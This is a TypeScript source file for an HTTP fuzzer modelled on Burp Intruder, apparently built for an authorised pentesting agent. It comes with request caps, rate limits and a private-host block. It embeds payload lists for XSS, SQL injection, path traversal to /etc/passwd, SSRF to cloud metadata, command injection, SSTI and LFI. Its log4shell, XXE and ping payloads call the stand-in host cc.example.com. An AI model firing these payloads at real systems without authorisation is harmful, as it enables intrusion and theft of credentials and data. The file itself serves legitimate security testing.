#!/usr/bin/env bun
/**
 * http-fuzzer.ts — Burp Suite Intruder equivalent.
 *
 * Substitute payloads into request placeholders and report responses
 * that look anomalous (different status, length, timing, error
 * fingerprints). Designed for the authorised pentester agent — see
 * the `burp-style-pentest-workflow` skill for the consent + audit
 * expectations.
 *
 * Attack types (matches Burp's terminology):
 *
 *   sniper       single payload position, one variable at a time
 *   battering    same payload across all positions in a single request
 *   pitchfork    parallel payload sets (same index in each)
 *   clusterbomb  cartesian product across all positions
 *
 * Placeholders are marked with `§` (Burp convention) — anywhere in
 * URL / header values / body. Examples:
 *
 *   --url "https://target/login" \
 *   --body 'user=admin&pass=§FUZZ§' \
 *   --payload-file passwords.txt \
 *   --type sniper
 *
 *   --url "https://target/api" \
 *   --header "Authorization: Bearer §TOKEN§" \
 *   --payloads "tok1,tok2,tok3" \
 *   --type sniper
 *
 * Detection: results are scored by:
 *   - status delta from baseline
 *   - response-length delta (z-score)
 *   - latency outliers
 *   - error keyword match (sql syntax, stack trace markers)
 *   - reflection of payload in response body
 *
 * Output: ranked table of "interesting" results — top 20 by default.
 *   --json full machine output for downstream tools.
 *
 * Safety:
 *   - hard cap 1000 total requests per invocation (overridable with
 *     --max-requests if you really know what you're doing)
 *   - default 10 req/s rate limit, can be tightened
 *   - refuses targets in `127.0.0.0/8`, `::1`, RFC1918, etc. by
 *     default unless --allow-private is passed (different from
 *     redteam-replay which DEFAULTS to private only). Reasoning:
 *     Intruder is for authorised engagements against real targets.
 */
import { argv } from "node:process"
import { readFileSync } from "node:fs"
import { performance } from "node:perf_hooks"
import {
  detectErrorFingerprints as detectFps,
  ensureHostAllowed,
  isPrivateHost as isPrivateHostLib,
  loadPayloadFile as loadPayloadFileLib,
} from "./_lib/common.ts"

// Built-in payload sets for common vuln classes (declared before dispatch
// so the lazy `parseOpts → loadPayloadSets` chain can reference them).
const BUILTIN_PAYLOADS: Record<string, string[]> = {
  "xss-basic": [
    `<script>alert(1)</script>`,
    `"><script>alert(1)</script>`,
    `'><img src=x onerror=alert(1)>`,
    `javascript:alert(1)`,
    `<svg onload=alert(1)>`,
    `<iframe src="javascript:alert(1)">`,
    `"><iframe srcdoc="<script>alert(1)</script>">`,
    `<details open ontoggle=alert(1)>`,
  ],
  "sqli-basic": [
    `'`, `"`, `\\`, `';`, `';--`,
    `' OR '1'='1`, `' OR 1=1--`, `') OR ('1'='1`,
    `1' UNION SELECT NULL--`, `1 UNION SELECT NULL,NULL--`,
    `'; WAITFOR DELAY '0:0:5'--`, `1' AND SLEEP(5)--`,
    `'||(SELECT 1 FROM dual)||'`, `' AND ASCII(SUBSTRING(@@version,1,1))=77--`,
  ],
  "path-traversal": [
    `../../etc/passwd`, `../../../etc/passwd`, `../../../../etc/passwd`,
    `..%2f..%2f..%2fetc%2fpasswd`, `..%252f..%252fetc%252fpasswd`,
    `..\\..\\..\\windows\\win.ini`, `....//....//....//etc/passwd`,
    `/etc/passwd%00`, `..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts`,
  ],
  "ssrf": [
    `http://127.0.0.1/`, `http://localhost/`,
    `http://169.254.169.254/latest/meta-data/`,
    `http://[::1]/`, `http://0.0.0.0/`, `http://0/`,
    `file:///etc/passwd`, `gopher://127.0.0.1:80/_GET / HTTP/1.0%0d%0a`,
    `dict://127.0.0.1:11211/stat`,
  ],
  "command-injection": [
    `;id`, `|id`, `\`id\``, `$(id)`, `&&id`, `||id`,
    `;cat /etc/passwd`, `|cat /etc/passwd`,
    `; ping -c 1 cc.example.com`,
    `' || id //`, `" || id //`,
  ],
  "open-redirect": [
    `https://example.com/`, `//example.com/`, `/\\example.com/`,
    `https:%2f%2fexample.com`, `https:\\\\example.com`,
    `https://target.com.example.com/`,
  ],
  "log4shell": [
    `\${jndi:ldap://cc.example.com/a}`,
    `\${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://cc.example.com/a}`,
  ],
  "xxe": [
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://cc.example.com/">]><foo>&xxe;</foo>`,
  ],
  "ssti": [
    `{{7*7}}`, `\${{7*7}}`, `<%= 7*7 %>`, `\${7*7}`, `#{7*7}`, `*{7*7}`,
    `{{config.items()}}`, `{{''.__class__.__mro__[2].__subclasses__()}}`,
  ],
  "lfi": [
    `php://filter/convert.base64-encode/resource=index.php`,
    `php://filter/read=convert.base64-encode/resource=index.php`,
    `expect://id`, `data:text/plain,<?php echo \`id\`;?>`,
  ],
}

const args = argv.slice(2)
const json = args.includes("--json")

const opts = parseOpts()

// ---------------------------------------------------------------------------
// Build attack matrix
// ---------------------------------------------------------------------------

const positions = collectPositions()
if (positions.length === 0) {
  console.error("✗ no §...§ placeholders found in URL/body/headers")
  process.exit(2)
}

const payloadSets = loadPayloadSets()
const matrix = buildMatrix(opts.attackType, positions.length, payloadSets)

if (matrix.length === 0) {
  console.error("✗ payload combinations resolved to zero — check --payloads / --payload-file")
  process.exit(2)
}

if (matrix.length > opts.maxRequests) {
  console.error(`✗ ${matrix.length} combinations exceeds --max-requests=${opts.maxRequests}`)
  console.error(`  re-run with --max-requests=${matrix.length} if intentional, or narrow payloads`)
  process.exit(2)
}

// ---------------------------------------------------------------------------
// Baseline (one request with payload="")
// ---------------------------------------------------------------------------

console.error(`Baseline request…`)
const baseline = await fireOne(positions.map(() => "")).catch((e) => {
  console.error(`  baseline failed: ${e instanceof Error ? e.message : String(e)}`)
  return null
})

// ---------------------------------------------------------------------------
// Fire matrix
// ---------------------------------------------------------------------------

const results: AttackResult[] = []
const tickMs = Math.max(50, 1000 / opts.rateLimit)
let lastTick = 0

console.error(`Firing ${matrix.length} request(s) at ${opts.rateLimit} req/s…`)
for (let i = 0; i < matrix.length; i++) {
  const wait = lastTick + tickMs - Date.now()
  if (wait > 0) await sleep(wait)
  lastTick = Date.now()
  try {
    const r = await fireOne(matrix[i])
    results.push(r)
    if (i % 25 === 24) console.error(`  ${i + 1}/${matrix.length} done`)
  } catch (e) {
    results.push({
      payloads: matrix[i],
      status: -1,
      latencyMs: 0,
      bytes: 0,
      bodySample: e instanceof Error ? e.message : String(e),
      reflected: false,
      errorMarkers: [],
    })
  }
}

// ---------------------------------------------------------------------------
// Score + report
// ---------------------------------------------------------------------------

const scored = scoreResults(results, baseline)
const topN = numFlag("top", 20)
const interesting = scored.slice(0, topN)

if (json) {
  console.log(JSON.stringify({ baseline, results: scored }, null, 2))
} else {
  console.log(`\n# Fuzzer report — ${results.length} requests, ${interesting.length} interesting\n`)
  if (baseline) {
    console.log(`Baseline:  ${baseline.status}  ${baseline.bytes} bytes  ${baseline.latencyMs} ms`)
    console.log()
  }
  console.log(
    [
      "score".padEnd(6),
      "status".padEnd(7),
      "Δlen".padEnd(8),
      "lat(ms)".padEnd(9),
      "refl".padEnd(5),
      "markers".padEnd(20),
      "payload",
    ].join(" "),
  )
  console.log("-".repeat(80))
  for (const r of interesting) {
    const delta = baseline ? r.bytes - baseline.bytes : r.bytes
    const refl = r.reflected ? "yes" : ""
    const markers = r.errorMarkers.slice(0, 2).join(",")
    const payload = r.payloads.map((p) => (p.length > 24 ? p.slice(0, 24) + "…" : p)).join(" | ")
    console.log(
      [
        String(r._score?.toFixed(1) ?? "-").padEnd(6),
        String(r.status).padEnd(7),
        String(delta).padEnd(8),
        String(r.latencyMs).padEnd(9),
        refl.padEnd(5),
        markers.padEnd(20),
        payload,
      ].join(" "),
    )
  }
  if (interesting.length === 0) {
    console.log("(no anomalous responses — all matched baseline within thresholds)")
  }
}

// ---------------------------------------------------------------------------
// Implementation
// ---------------------------------------------------------------------------

interface Opts {
  url: string
  method: string
  headers: Record<string, string>
  body?: string
  attackType: "sniper" | "battering" | "pitchfork" | "clusterbomb"
  maxRequests: number
  rateLimit: number // req/s
  timeoutMs: number
  allowPrivate: boolean
}

function parseOpts(): Opts {
  const url = required("url")
  const method = (parseFlag("method") ?? "GET").toUpperCase()
  const body = parseFlag("body") ?? undefined
  const attackType = (parseFlag("type") ?? "sniper") as Opts["attackType"]
  if (!["sniper", "battering", "pitchfork", "clusterbomb"].includes(attackType)) {
    bail(`bad --type: ${attackType}`)
  }
  const maxRequests = numFlag("max-requests", 1000)
  const rateLimit = numFlag("rate-limit", 10)
  const timeoutMs = numFlag("timeout", 15_000)
  const allowPrivate = args.includes("--allow-private")

  const headers: Record<string, string> = {}
  for (let i = 0; i < args.length; i++) {
    if (args[i] === "--header" || args[i] === "-H") {
      const v = args[i + 1]
      if (!v) continue
      const idx = v.indexOf(":")
      if (idx <= 0) continue
      headers[v.slice(0, idx).trim()] = v.slice(idx + 1).trim()
    }
  }

  ensureHostAllowed(url, allowPrivate)

  return { url, method, headers, body, attackType, maxRequests, rateLimit, timeoutMs, allowPrivate }
}

interface Position {
  source: "url" | "body" | `header:${string}`
  start: number
  end: number
  name: string
}

function collectPositions(): Position[] {
  const out: Position[] = []
  const re = /§([A-Za-z0-9_]*)§/g
  let m: RegExpExecArray | null

  while ((m = re.exec(opts.url)) !== null) {
    out.push({ source: "url", start: m.index, end: m.index + m[0].length, name: m[1] || `pos${out.length}` })
  }
  if (opts.body) {
    const reB = /§([A-Za-z0-9_]*)§/g
    while ((m = reB.exec(opts.body)) !== null) {
      out.push({ source: "body", start: m.index, end: m.index + m[0].length, name: m[1] || `pos${out.length}` })
    }
  }
  for (const [k, v] of Object.entries(opts.headers)) {
    const reH = /§([A-Za-z0-9_]*)§/g
    let mm: RegExpExecArray | null
    while ((mm = reH.exec(v)) !== null) {
      out.push({
        source: `header:${k}` as `header:${string}`,
        start: mm.index,
        end: mm.index + mm[0].length,
        name: mm[1] || `pos${out.length}`,
      })
    }
  }
  return out
}

function loadPayloadSets(): string[][] {
  // Each --payload-file or --payloads contributes one set.
  // pitchfork/clusterbomb consume one set per position.
  const sets: string[][] = []
  for (let i = 0; i < args.length; i++) {
    if (args[i] === "--payload-file") {
      const path = args[i + 1]
      if (!path) continue
      sets.push(loadPayloadFileLib(path))
    } else if (args[i] === "--payloads") {
      sets.push((args[i + 1] ?? "").split(",").map((s) => s.trim()).filter(Boolean))
    } else if (args[i] === "--builtin") {
      const name = args[i + 1]
      if (name && BUILTIN_PAYLOADS[name]) sets.push(BUILTIN_PAYLOADS[name])
      else bail(`unknown --builtin: ${name}. Available: ${Object.keys(BUILTIN_PAYLOADS).join(", ")}`)
    }
  }
  return sets
}

// (BUILTIN_PAYLOADS is declared near the top of the file so the dispatch
// can reference it before the rest of the script is parsed.)

function buildMatrix(type: Opts["attackType"], nPos: number, sets: string[][]): string[][] {
  if (type === "sniper") {
    // Vary one position at a time — others empty / unchanged.
    const all = sets[0] ?? []
    const out: string[][] = []
    for (let pos = 0; pos < nPos; pos++) {
      for (const p of all) {
        const row: string[] = new Array(nPos).fill("")
        row[pos] = p
        out.push(row)
      }
    }
    return out
  }
  if (type === "battering") {
    const all = sets[0] ?? []
    return all.map((p) => new Array(nPos).fill(p))
  }
  if (type === "pitchfork") {
    if (sets.length < nPos) bail(`pitchfork needs ${nPos} payload sets, got ${sets.length}`)
    const len = Math.min(...sets.slice(0, nPos).map((s) => s.length))
    const out: string[][] = []
    for (let i = 0; i < len; i++) out.push(sets.slice(0, nPos).map((s) => s[i]))
    return out
  }
  if (type === "clusterbomb") {
    if (sets.length < nPos) bail(`clusterbomb needs ${nPos} payload sets, got ${sets.length}`)
    const out: string[][] = [[]]
    for (let i = 0; i < nPos; i++) {
      const next: string[][] = []
      for (const partial of out) {
        for (const p of sets[i]) next.push([...partial, p])
      }
      out.length = 0
      out.push(...next)
    }
    return out
  }
  return []
}

interface AttackResult {
  payloads: string[]
  status: number
  latencyMs: number
  bytes: number
  bodySample: string
  reflected: boolean
  errorMarkers: string[]
  _score?: number
}

async function fireOne(payloads: string[]): Promise<AttackResult> {
  // Substitute placeholders in URL/body/headers.
  let url = opts.url
  let body = opts.body
  const headers = { ...opts.headers }

  // Replace from rightmost first so offsets stay valid.
  const sortedPositions = [...positions].reverse()
  for (const pos of sortedPositions) {
    const idx = positions.indexOf(pos)
    const payload = payloads[idx] ?? ""
    if (pos.source === "url") {
      url = url.slice(0, pos.start) + payload + url.slice(pos.end)
    } else if (pos.source === "body" && body !== undefined) {
      body = body.slice(0, pos.start) + payload + body.slice(pos.end)
    } else if (pos.source.startsWith("header:")) {
      const k = pos.source.slice("header:".length)
      const v = headers[k]
      if (v) headers[k] = v.slice(0, pos.start) + payload + v.slice(pos.end)
    }
  }

  const ctrl = new AbortController()
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs)
  const t0 = performance.now()
  try {
    const res = await fetch(url, { method: opts.method, headers, body, signal: ctrl.signal })
    const latencyMs = Math.round(performance.now() - t0)
    const text = await res.text().catch(() => "")
    const bodySample = text.slice(0, 4096)
    const reflected = payloads.some((p) => p.length >= 3 && bodySample.includes(p))
    const errorMarkers = detectErrors(bodySample)
    return {
      payloads,
      status: res.status,
      latencyMs,
      bytes: text.length,
      bodySample,
      reflected,
      errorMarkers,
    }
  } finally {
    clearTimeout(t)
  }
}

function detectErrors(body: string): string[] {
  // Delegate to shared lib (covers more fingerprints incl. credential leaks,
  // private keys, CSRF protection markers, etc.)
  return detectFps(body)
}

function scoreResults(rs: AttackResult[], baseline: AttackResult | null): AttackResult[] {
  // Score = weighted sum:
  //   status delta from baseline   ×  3
  //   length z-score (>2)          ×  2
  //   latency z-score (>2)         ×  1
  //   reflection                   × 5
  //   error markers                × 5 each
  const lengths = rs.map((r) => r.bytes).filter((x) => x > 0)
  const meanLen = lengths.reduce((a, b) => a + b, 0) / Math.max(1, lengths.length)
  const stdLen = Math.sqrt(lengths.reduce((a, b) => a + (b - meanLen) ** 2, 0) / Math.max(1, lengths.length))
  const latencies = rs.map((r) => r.latencyMs).filter((x) => x > 0)
  const meanLat = latencies.reduce((a, b) => a + b, 0) / Math.max(1, latencies.length)
  const stdLat = Math.sqrt(latencies.reduce((a, b) => a + (b - meanLat) ** 2, 0) / Math.max(1, latencies.length))

  for (const r of rs) {
    let s = 0
    if (baseline && r.status !== baseline.status) s += 3
    if (stdLen > 0 && Math.abs(r.bytes - meanLen) / stdLen > 2) s += 2
    if (stdLat > 0 && Math.abs(r.latencyMs - meanLat) / stdLat > 2) s += 1
    if (r.reflected) s += 5
    s += r.errorMarkers.length * 5
    r._score = s
  }
  return [...rs].filter((r) => (r._score ?? 0) > 0).sort((a, b) => (b._score ?? 0) - (a._score ?? 0))
}

// (private-host check now lives in _lib/common.ts via ensureHostAllowed)
function isPrivateHost(host: string): boolean {
  return isPrivateHostLib(host)
}

function sleep(ms: number) {
  return new Promise<void>((r) => setTimeout(r, ms))
}

function parseFlag(name: string): string | null {
  const a = args.find((x) => x.startsWith(`--${name}=`))
  if (a) return a.slice(`--${name}=`.length)
  const idx = args.indexOf(`--${name}`)
  if (idx >= 0 && args[idx + 1] && !args[idx + 1].startsWith("--")) return args[idx + 1]
  return null
}

function numFlag(name: string, dflt: number): number {
  const v = parseFlag(name)
  if (v == null) return dflt
  const n = Number(v)
  return Number.isFinite(n) && n > 0 ? n : dflt
}

function required(name: string): string {
  const v = parseFlag(name)
  if (v == null) bail(`missing --${name}`)
  return v as string
}

function bail(msg: string): never {
  console.error(`✗ ${msg}`)
  process.exit(2)
}
